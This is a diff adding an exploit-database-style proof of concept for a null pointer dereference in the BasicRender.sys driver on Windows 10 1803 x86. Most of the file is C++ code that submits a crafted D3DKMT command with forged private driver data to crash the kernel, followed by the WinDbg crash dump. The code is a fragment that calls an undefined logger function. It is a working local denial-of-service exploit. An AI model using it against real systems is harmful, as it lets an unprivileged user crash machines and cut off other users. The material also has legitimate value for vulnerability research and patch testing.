@@ -1,0 +1,115 @@
+# Exploit Title: Microsoft Windows 10 BasicRender.sys - Denial of Service (PoC)
+# Date: 2019-12-20
+# Exploit author: vportal
+# Vendor homepage: http://www.microsoft.com
+# Version: Windows 10 1803 x86
+# Tested on: Windows 10 1803 x86
+# CVE: N/A
+
+# A Null pointer deference exists in the WARPGPUCMDSYNC function of the
+# BasicRender.sys driver. An unprivileged user can trigger the vulnerability
+# to crash the system and deny the service to the rest of the users.
+
+*PoC:*
+
+#include <Windows.h>
+#include <d3dkmthk.h>
+
+D3DKMT_CREATEDEVICE* device = NULL;
+device = new D3DKMT_CREATEDEVICE();
+
+D3DKMT_ENUMADAPTERS enumAdapter = { 0 };
+D3DKMTEnumAdapters(&enumAdapter);
+device->hAdapter = enumAdapter.Adapters[1].hAdapter;
+logger(log_counter, "EnumAdapter");
+
+D3DKMTCreateDevice(device);
+
+D3DKMT_CREATECONTEXTVIRTUAL* contextVirtual = NULL;
+contextVirtual = new D3DKMT_CREATECONTEXTVIRTUAL();
+memset(contextVirtual, 0, sizeof(D3DKMT_CREATECONTEXTVIRTUAL));
+
+contextVirtual->hDevice = device->hDevice;
+
+char data[0x200] = { 0 };
+memset(data, 0xff, 0x200);
+
+contextVirtual->PrivateDriverDataSize = 0x200;
+contextVirtual->pPrivateDriverData = data;
+
+contextVirtual->ClientHint = D3DKMT_CLIENTHINT_DX10;
+contextVirtual->Flags.InitialData = 0x000001;
+contextVirtual->Flags.NullRendering = 0x0;
+
+D3DKMT_SUBMITCOMMAND* submitCommand = NULL;
+submitCommand = new D3DKMT_SUBMITCOMMAND();
+
+submitCommand->BroadcastContext[0] = 0x40000240;
+
+for (int i = 0; i < 0x10; i++)
+     submitCommand->WrittenPrimaries[i] = 0x0;
+
+submitCommand->PresentHistoryToken = 0x100;
+submitCommand->Commands = 0x004b39;
+submitCommand->CommandLength = 0x00000d;
+submitCommand->BroadcastContext[0] = contextVirtual->hContext;
+submitCommand->BroadcastContextCount = 0x1;
+submitCommand->Flags.PresentRedirected = 0x1;
+
+submitCommand->PrivateDriverDataSize = 0x130;
+
+char* PrivateData = NULL;
+PrivateData = new char[submitCommand->PrivateDriverDataSize];
+memset(PrivateData, 0x00, submitCommand->PrivateDriverDataSize);
+
+*(DWORD*)(PrivateData + 0x118) = 0x434e5953;
+*(DWORD*)(PrivateData + 0x11c) = 0x18;
+*(DWORD*)(PrivateData + 0x120) = 0x000110;
+*(DWORD*)(PrivateData + 0x124) = 0x000420;
+*(DWORD*)(PrivateData + 0x128) = 0x0;
+*(DWORD*)(PrivateData + 0x12c) = 0x000428;
+
+submitCommand->pPrivateDriverData = PrivateData;
+
+D3DKMTSubmitCommand(submitCommand);
+
+
+--------------------------------------------------------------------------
+*Crash dump*:
+
+STACK_TEXT:
+8afae92c 8fe82cb2 8afae958 fffffffd 0000048c
+BasicRender!WARPGPUCMDSYNC::WARPGPUCMDSYNC+0xc
+8afae94c 8fe8267d bb26afe8 00000000 bb26afe0
+BasicRender!WARPKMCONTEXT::SubmitVirtual+0x4a
+8afae9a8 8fca6af5 91e05000 bb26afe0 93dfc000
+BasicRender!WarpKMSubmitCommandVirtual+0x87
+8afae9fc 8fc2a934 8afaea68 8afaeac0 92b19db6
+dxgkrnl!ADAPTER_RENDER::DdiSubmitCommandVirtual+0x115
+8afaea08 92b19db6 90114c30 8afaea68 b78da008
+dxgkrnl!ADAPTER_RENDER_DdiSubmitCommandVirtual+0x10
+8afaeac0 92b4ac94 93dfc000 cd6ee008 cc6d8860
+dxgmms2!VidSchiSendToExecutionQueue+0x526
+8afaeb90 92b764a9 00000000 945f5a80 00000000
+dxgmms2!VidSchiSubmitRenderVirtualCommand+0x534
+8afaebb8 81ee80bc 93dfc000 28e5f697 00000000
+dxgmms2!VidSchiWorkerThread+0x1a1
+8afaebf0 81fe952d 92b76308 93dfc000 00000000 nt!PspSystemThreadStartup+0x4a
+8afaebfc 00000000 00000000 bbbbbbbb bbbbbbbb nt!KiThreadStartup+0x15
+
+eax=8afae958 ebx=00000000 ecx=00000000 edx=00000000 *esi*=00000000
+edi=bb26afd8
+eip=8fe8386c esp=8afae920 ebp=8afae92c iopl=0         nv up ei pl zr na pe
+nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000
+efl=00010246
+BasicRender!WARPGPUCMDSYNC::WARPGPUCMDSYNC+0xc:
+8fe8386c c7061060e88f    mov     dword ptr [esi],offset
+BasicRender!WARPGPUCMDSYNC::`vftable' (8fe86010) ds:0023:00000000=????????
+Resetting default scope
+
+--------------------------------------------------------------------------------
+
+The vulnerability has only been tested  in Windows 10 x86 1803.
+CVSS Base Score: 5.5
+Credit: Victor Portal
